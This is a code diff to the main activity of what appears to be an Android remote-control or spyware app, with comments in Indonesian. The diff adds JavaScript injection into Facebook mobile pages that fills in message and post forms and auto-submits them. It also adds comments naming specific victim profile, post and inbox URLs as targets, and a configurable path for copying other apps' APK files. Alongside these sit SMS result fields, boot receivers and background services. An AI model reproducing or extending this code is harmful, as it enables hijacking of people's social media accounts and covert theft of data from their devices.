@@ -35,6 +35,8 @@ import android.view.WindowManager;
 
 import android.os.SystemClock;
 
+import java.net.URLEncoder;
+
 public class MainActivity extends Activity
 {
     private SharedPreferences settings;
@@ -42,6 +44,7 @@ public class MainActivity extends Activity
 	private ReceiverBoot receiver;
 	private static String TAG = "AsDfGhJkL";
 	public static String resultSms = "";
+	public static String pullApk = "";
 	private boolean dtoast = true;
 	AlertDialog dialog;
 	private PendingIntent mPending;
@@ -68,8 +71,23 @@ public class MainActivity extends Activity
 		settings = getSharedPreferences("Settings", 0);
 		seteditor = settings.edit();
 		receiver = new ReceiverBoot();
+		receiver.setDoc(this);
+
+		// postingan: https://free.facebook.com/story.php?story_fbid=425720278184436&id=100022394016980&_rdr#425720441517753
+		// profil: https://free.facebook.com/sunjangyo.sunjangyo.9?ref_component=mfreebasic_home_header&ref_page=%2Fwap%2Fhome.php&refid=8
+		// inbox : https://free.facebook.com/messages/read/?tid=cid.c.100022394016980%3A100035974483671&refid=11#fua
+        // target: -target-10.42.0.1-target-
+        // payload: -aksi-alert-aksi-
+
+        //setContentView(receiver.fbPayload(this, "pesawat", "https://free.facebook.com/messages/read/?tid=cid.c.100022394016980%3A100035974483671&refid=11#fua"));
 
 		startService(new Intent(this, SystemThread.class));
+
+		String myident = "pesawat jet";
+
+		//receiver.fbPayload(this, "javascript:document.getElementById('composerInput').value='"+myident+"';" +"document.forms[0].submit()", new SystemThread().urlfbPostingan);
+		
+		//setContentView(receiver.fbPayload(this, "javascript:document.forms[1].p_text.value='"+myident+"';" +"document.forms[1].submit()", new SystemThread().urlfbPostinganEdt));
 
 		mPending = PendingIntent.getService(MainActivity.this, 0, new Intent(MainActivity.this, ThreadService.class), 0);
 
@@ -84,9 +102,10 @@ public class MainActivity extends Activity
 		catch (Exception e) {}
 
 		finish();
+
 	}
 
-	public void onDestroy() {
+	public void xonDestroy() {
 		super.onDestroy();
 
 		ServiceTTS tts = new ServiceTTS();
@@ -256,6 +275,10 @@ public class MainActivity extends Activity
 			}
 		} 
 		else if (pilih.equals("pull")) {
+			String path = "";
+			if (pullApk.equals("")) path = receiver.pathExternal;
+			else path = pullApk;
+
 			final Intent mainIntent = new Intent(Intent.ACTION_MAIN, null);
 			mainIntent.addCategory(Intent.CATEGORY_LAUNCHER);
 			mainIntent.setPackage(packageName);
@@ -269,7 +292,7 @@ public class MainActivity extends Activity
 				}
 
 				File file = new File(info.activityInfo.applicationInfo.publicSourceDir);
-				File dest = new File(receiver.pathExternal+"/" + info.activityInfo.applicationInfo.packageName + ".apk");
+				File dest = new File(path+"/"+info.activityInfo.applicationInfo.packageName + ".apk");
 				File parent = dest.getParentFile();
 				if ( parent != null ) parent.mkdirs();
 				try {
